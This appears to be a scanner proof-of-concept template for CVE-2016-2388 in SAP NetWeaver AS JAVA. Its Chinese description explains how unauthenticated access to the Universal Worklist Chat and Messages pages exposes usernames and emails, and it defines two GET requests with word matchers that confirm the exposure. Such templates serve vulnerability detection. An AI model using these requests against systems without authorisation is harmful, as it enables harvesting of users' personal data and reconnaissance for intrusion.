[info]
author = "ave"
description = "通过访问 SAP NetWeaver AS JAVA 的 Universal Worklist 配置页面，无需认证即可获取系统用户列表。访问 /webdynpro/resources/sap.com/tc~rtc~coll.appl.rtc~wd_chat/Chat# 或 Messages# 页面，点击 Choose 按钮后搜索可获取 SAP 用户名、邮箱等敏感信息。"
id = "POC-AVE-2016-0200"
name = "SAP NetWeaver AS JAVA 信息泄露漏洞 PoC"
severity = "medium"
tags = ["ave-2016-0200"]
vuln_id = [
    "CVE-2016-2388",
    "AVE-2016-0200",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/webdynpro/resources/sap.com/tc~rtc~coll.appl.rtc~wd_chat/Chat"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "wd_chat",
    "SAP",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/webdynpro/resources/sap.com/tc~rtc~coll.appl.rtc~wd_chat/Messages"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "wd_chat",
    "SAP",
]
